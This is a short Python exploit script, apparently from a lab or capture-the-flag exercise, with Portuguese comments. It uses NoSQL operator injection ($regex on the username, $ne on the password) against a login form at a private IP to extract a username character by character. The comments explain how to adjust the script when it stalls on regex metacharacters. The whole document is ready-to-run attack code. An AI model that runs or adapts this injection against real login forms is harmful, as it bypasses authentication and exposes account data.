import requests
import string

chars = string.printable



def extract(valor_atual, valor_anterior):
   data = {"username[$regex]": valor_atual + valor_anterior, "password[$ne]": "a"}
   r = requests.post("http://10.10.0.17/", data=data)

   return r.text

def main():
   valor_completo = "^"
   while True:
      for printable in chars:
         if(printable == "*" or printable == "+" or printable == "." or printable == "?"): continue
         result = extract(valor_completo, printable)
         if "Login ou senha inválido!" in result:
            valor_completo = valor_completo + printable
            break
         print(str(valor_completo) + str(printable))

main()

## Caso o exploit trave por algum motivo em algum caractere espefícico
## Tente rodar manualmente com alguns dos caracteres que demos continue acima,
## Como o *, o ., + e ?. Adicione cada um deles e realize um fuzzing em cada um.
## De uma forma mais fácil, só remover a condição. Exemplo: 
## if(printable == "*" or printable == "+" or printable == "?"): continue
## Condição do . foi removida.
